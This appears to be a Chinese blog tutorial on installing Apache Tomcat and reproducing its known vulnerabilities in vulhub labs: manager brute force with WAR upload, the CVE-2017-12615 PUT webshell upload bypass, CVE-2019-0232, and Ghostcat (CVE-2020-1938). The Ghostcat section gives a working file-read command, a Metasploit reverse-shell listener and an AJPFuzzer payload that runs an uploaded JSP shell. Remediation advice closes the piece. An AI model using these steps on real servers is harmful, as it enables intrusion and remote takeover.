0x00 前言

最近挺常见tomcat漏洞的，打算总结一下。在复现一款软件或者产品的漏洞时，我倾向于源码安装一遍，而不是用docker无脑拉取搭建，这样能够快速熟悉内部目录结构、功能特征等，为接下来的漏洞复现与渗透测试做了很好的预热，理解也会更加深一些。如果只想要看漏洞总结可以直接跳到漏洞复现部分。

apache软件基金会开源项目、轻量级、性能稳定、调试jsp程序首选，常用于中小型企业且并发需求不是很多的网站。可以看作是apache的一个扩展，但是运行的时候和apache属于不同的进程，独立于apache。

0x01 Linux部署tomcat

tomcat下载地址官网：https://tomcat.apache.org/

一、安装与启动tomcat

1、将下载的安装包放入kali的/usr/src目录下面并解包

2、切换至 tomcat 目录下的 bin 目录，然后通过 ./startup.sh 命令打开该脚本文件，启动tomcat成功

二、关闭tomcat

运行bin目录下的shutdown.sh即可

三、卸载tomcat

很简单，删除/usr/src下的tomcat目录即可。

四、tomcat端口号更改

tomcat存在三个端口，tomcat默认的端口是8080（访问端口），真正在项目上线之后，通常采用80。

修改/usr/src/tomcat/conf/server.xml文件中的Connector端口号为期望端口后重启tomcat即可。

关于tomcat三个端口号的讲解可以参考此文章，这里不多赘述

https://blog.csdn.net/cheweigai9298/article/details/100849492

五、后台用户名与密码配置(重要)

1、点击下方图片此位置或者直接在URL后面输入/manager

2、在不知道用户名和密码的情况下，Tomcat Manager的用户名和密码可以到Tomcat安装目录/conf/tomcat-users.xml中进行查看。可以看到，默认情况下，Tomcat Manager的用户名和密码是注释掉的（在），即Tomcat Manager默认是禁用的。

3、要使用Tomcat Manager，就要对用户进行配置（或取消注释符即可使用已配置的用户）。对用户的配置需要放在<tomcat-users>和</tomcat-users>之间。

4、重启tomcat后，就可以看到tomcat进入后台成功，但是显示403禁止访问。但是通过看回显报错指示，tomcat-users.xml文件中配置出了问题。

5、将之前改的manager改为manager-gui即可。

6、登陆之后会看到一系列目录，就是tomcat目录中webapps中的文件目录，所有我们要在tomcat里运行的web项目都要存放在webapps中。

0x02 windows搭建

一、安装JDK和Tomcat

所需物料：

jdk-8u311-windows-x64.exe

apache-tomcat-8.5.78-windows-x64.zip

1、安装JDK：解压即可，尽量在C盘下，我的在C:\Program Files\Java\jdk1.8.0_311

备注：路径可以其他盘符，不建议路径包含中文名及特殊符号。

2、安装Tomcat：直接解压缩下载文件“apache-tomcat-8.0.53-windows-x64.zip”到C盘下。安装路径建议修改为：C:\tomcat。

二、配置JDK环境变量（在步骤查看如何配置环境变量）

1、新建变量名：JAVA_HOME，变量值：C:\Program Files\Java\jdk1.8.0_311

2、打开path，添加变量值：%JAVA_HOME%\bin

备注：

1、%JAVA_HOME%就是引用前面指定的JAVA_HOME

2、JAVA_HOME指明JDK安装路径，此路径下包括lib，bin，jre等文件夹，tomcat，eclipse等的运行都需要依靠此变量。

3、path使得系统可以在任何路径下识别java命令。

三、测试JDK

在CMD命令下输入javac，java，javadoc命令：出现图示界面，表示安装成功。

四、配置Tomcat环境变量

1，新建变量名：CATALINA_HOME，变量值：C:\tomcat\apache-tomcat-8.5.78

2，打开path，添加变值：%CATALINA_HOME%\bin

五、启动tomcat

bin目录下双击start.bat即可

0x04 常见漏洞总结

tomcat的漏洞一直是一个热点，正是因为tomcat搭建简单快速，使用的人慢慢多了起来。那么也就成为了漏洞了。以前有，将来也会有，这里只总结出近几年常见的、经典的高危漏洞。

一、后台弱口令爆破部署war包

tomcat是可以爆破的，在之前的搭建我们知道了tomcat的后台是/manager，一旦爆破成功进入后台，就可以在直接将jsp木马打包成war包，然后上传从而getshell。这里就不多赘述了，操作比较简单，一般也比较少见。

二、CVE-2017-12615任意文件写入(上传)

01、漏洞概述

2017年9月19日，Apache Tomcat官方确认并修复了由于配置不当(非默认配置)而任意文件上传的高危漏洞：CVE-2017-12615

02、漏洞原理

一句话：在tomcat的配置文件web.xml中，没有限制PUT方法，从而可以任意写入文件。虽然限制了jsp文件的写入，但是可以多种方法绕过。

漏洞环境用的是vulhub-master。进入到vulhub目录下docker-compose up -d，随后docker exec -it id bash进入容器查看配置文件web.xml

可以看到/usr/local/tomcat/conf/web.xml里面的readonly字段是false，也就是说用户可以任意写入文件从而写入木马getshell。

03、漏洞复现

1、vulhub搭建完毕后，访问页面，抓包修改请求方式为PUT，写入一个文件测试如下：

2、尝试写入shell.jsp，内容为冰蝎的jsp木马，发现响应码为404被拦截。

3、换一个木马名称并使用/来绕过，在jsp后缀后面使用，因为在文件名中是非法的，在windows和linux中都会自动去除。

4、可以看到docker tomcat网站根目录里面存在着b.jsp。

5、随后冰蝎连接jsp木马即可。

三、CVE-2019-0232 Tomcat RCE

2019年4月13号，Apache Tomcat 9.0.18版本公告中提到，本次更新修复了一个代号为CVE-2019-0232的漏洞。

该漏洞只对Windows平台有效，Apache Tomcat 9.0.0.M1到9.0.17,8.5.0到8.5.39和7.0.0到7.0.93中的CGI Servlet很容易受到远程执行代码的影响，攻击者向CGI Servlet发送一个精心设计的请求，可在具有Apache Tomcat权限的系统上注入和执行任意操作系统命令。漏洞成因是当将参数从JRE传递到Windows环境时，由于CGI_Servlet中的输入验证错误而存在该漏洞。

01、触发该漏洞需要同时满足以下条件：

1、系统为Windows

2、启用了CGI Servlet（默认为关闭）

3、 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）

所以别看漏洞是RCE，但是条件较为苛刻。

02、漏洞范围

Apache Tomcat 9.0.0.M1 to 9.0.17
Apache Tomcat 8.5.0 to 8.5.39
Apache Tomcat 7.0.0 to 7.0.93

我这里用的就是上述windows搭建的tomcat版本

1、Tomcat的 CGI_Servlet组件默认是关闭的，在tomcat/conf/web.xml中找到注释的 CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable

<init-param>
  <param-name>executable</param-name>
  <param-value></param-value>
</init-param>

四、CVE-2020-1938 "幽灵猫"AJP文件包含漏洞(重点)

01、漏洞概述

这是一个十分严重和经典的漏洞，Tomcat默认开启的AJP服务**(8009端口)存在一处文件包含缺陷，攻击者通过Tomcat AJP Connector可以读取或包含Tomcat上所有webapp目录下的任意文件，例如可以读取webapp配置文件或源码。此外在目标应用有文件上传功能的情况下，==配合文件包含的利用还可以达到远程代码执行的危害==**。

POC:
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
RCE-EXP：

02、影响版本

Apache Tomcat6
Apache Tomcat7.0.100
Apache Tomcat8.5.51
Apache Tomcat9.0.31

03、漏洞复现

1、依旧是使用vulhub，进入tomcat/CVE-2020-1938后启动apache tamcat服务

2、端口扫描发现8009 8080端口开启，证明有该漏洞。

3、接着利用POC文件尝试查看tomcat的配置文件web.xml,注意执行环境为python2。回显的内容就是web.xml中的内容。

python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 目标ip –p 8009 –f WEB-INF/web.xml

04、漏洞利用——RCE

如果此应用在网站服务中具备上传功能，攻击者也可以先向服务端上传一个含有JSP代码的恶意文件(上传文件可以是任意类型，图片、纯文本文件等)，然后利用Gh0stcat进行文件包含，从而达到代码执行的危害。

这里提供一个利用思路：目标tomcat具有文件上传功能，同时存在sql注入，虽然sql注入没有权限直接getshell，但是能够查出上传图片名称，从而利用“幽灵猫”进行RCE攻击。所以现在在外网打点很少见到sql注入getshell的情况，但是可以利用这个漏洞配合其他漏洞来造成危害。

1、假设环境中存在文件上传功能，并且我们通过msfvenom制作了一个jsp的图片马上传，我这里用python的http服务来模拟了。

2、启动msf监听

msfconsole -x "handler -H 0.0.0.0 -P 5555 -p java/jsp_shell_reverse_tcp" 

3、下载ajpfuzzer_v0.6.jar

https://github.com/doyensec/ajpfuzzer/releases

4、启动ajpfuzzer_v0.6.jar，连接目标机器的8009端口

5、构造payload，shell.png是相对于tomcat根目录/webapps/ROOT/的路径，如果环境中存在文件上传目录upload，可以改成upload/xxx.png，其中xxx.png的名字就是我们上传后的图片名字，网站肯定会重命名，所以可以配合其他漏洞例如sql注入来获取。

forwardrequest 2 "HTTP/1.1" "/11.jsp" 192.168.31.150 192.168.31.150 porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:11.jsp","javax.servlet.include.path_info:shell.png","javax.servlet.include.servlet_path:/"

6、将上述payload运行在AJPFuzzer终端中，稍等片刻msf就获取到了session

7、不过这个session是一个不太完整的session，可以使用sessions -u 将其转换成meterpreter

05、修复建议

1、临时禁用AJP协议端口，在conf/server.xml配置文件中注释掉：<Connector port=“8009” protocol="AJP/1.3"redirectPort=“8443” />

2、配置ajp配置中的secretRequired跟secret属性来限制认证

3、下载更新版本。
